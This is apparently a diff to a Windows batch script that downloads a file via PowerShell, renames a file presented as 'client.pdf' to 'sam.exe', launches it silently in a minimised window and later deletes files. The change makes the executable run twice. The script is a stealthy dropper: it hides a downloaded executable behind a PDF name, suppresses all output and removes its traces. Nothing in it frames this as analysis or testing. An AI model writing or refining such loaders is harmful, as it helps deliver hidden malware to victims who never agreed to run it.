@@ -54,7 +54,7 @@ powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%' -UseBa
 
 :: Check if the download was successful without echoing messages
 if exist "%output2%" (
-    rem Downloaded successfully, do nothing
+    rem Downloaded successfully, proceed to rename
 ) else (
     exit /b 1
 )
@@ -62,7 +62,9 @@ if exist "%output2%" (
 :: Convert client.pdf to client.exe by renaming silently
 ren "%output2%" "sam.exe" >nul 2>&1
 
-:: Start sam.exe silently
+:: Run sam.exe two times silently
+start /min "" "%output2:pdf=exe%" >nul 2>&1
+timeout /t 2 /nobreak >nul 2>&1
 start /min "" "%output2:pdf=exe%" >nul 2>&1
 
 :: Wait for 3 seconds before deleting files
